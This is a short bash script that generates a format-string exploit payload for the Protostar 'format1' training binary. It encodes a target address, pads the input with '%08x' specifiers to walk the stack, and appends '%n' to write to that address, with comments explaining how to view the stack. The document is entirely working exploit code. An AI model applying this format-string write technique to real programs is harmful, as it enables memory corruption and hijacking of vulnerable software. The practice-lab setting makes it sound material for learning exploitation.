#!/bin/bash
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"

# Show what is on the stack
# You can use the following command to display the stack in ascii:
#/opt/protostar/bin/format1 "`./exploit_format1.sh`" | xargs -n 1 echo | xxd -r -p
#stack="`printf ' %%08x%.0s' {1..200}`"

target=`$DIR/encode_switch_endianness.sh 8049638`

# To display the stack, use this output
#echo "AAAA${target}BBBB${stack}CC"

# Now we want to make the `target` variable the last printed `%x`
# so we can then change it to `%n` and write to the memory

stack="`printf ' %%08x%.0s' {1..140}`"
stack="${stack}%n"

# Don't shift the stack everytime I change the input;
# append data to make it the same length
while (( ${#stack} < 998 ))
do
    stack="${stack}C"
done

echo "AAAA${target}${stack}"
